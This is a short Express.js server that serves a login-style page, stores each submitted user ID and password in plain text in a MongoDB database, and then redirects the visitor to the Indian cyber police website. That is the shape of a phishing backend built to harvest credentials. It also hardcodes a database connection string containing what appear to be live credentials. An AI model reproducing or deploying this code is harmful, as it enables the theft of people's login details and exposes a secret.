const express = require('express')
const XLSX= require('xlsx')
const app = express()
const port = 3000
const path = require('path')

const mongoose = require("mongoose");

const bodyParser = require('body-parser');
app.use(bodyParser.urlencoded({ extended: true}))
const connectDB= async()=>{
  try {
      await mongoose.connect("mongodb+srv://pratyush2582002:i9sIlFiQ6gYCYwS1@cluster0.qloxfsr.mongodb.net/test");
      console.log(`mongo connected`)
  } catch (error) {
      console.log("error")
  }
}
connectDB();


const UserSchema = new mongoose.Schema({
  name: {
    type: String,
    required: true,
  },
  pass: {
    type: String,
    required: true,
  },
});

const User = mongoose.model("User", UserSchema);


app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, '/index/index.html'))
})



  app.post('/',async(req,res)=>{
    const user = new User({name: req.body.userId,pass: req.body.pass});
  
    try {
      await user.save();
      res.redirect("https://cyberpolice.nic.in/");
    } catch (error) {
      res.redirect("/");
    }
  })

  



app.listen(port, () => {
  console.log(`Example app listening on port ${port}`)
})

































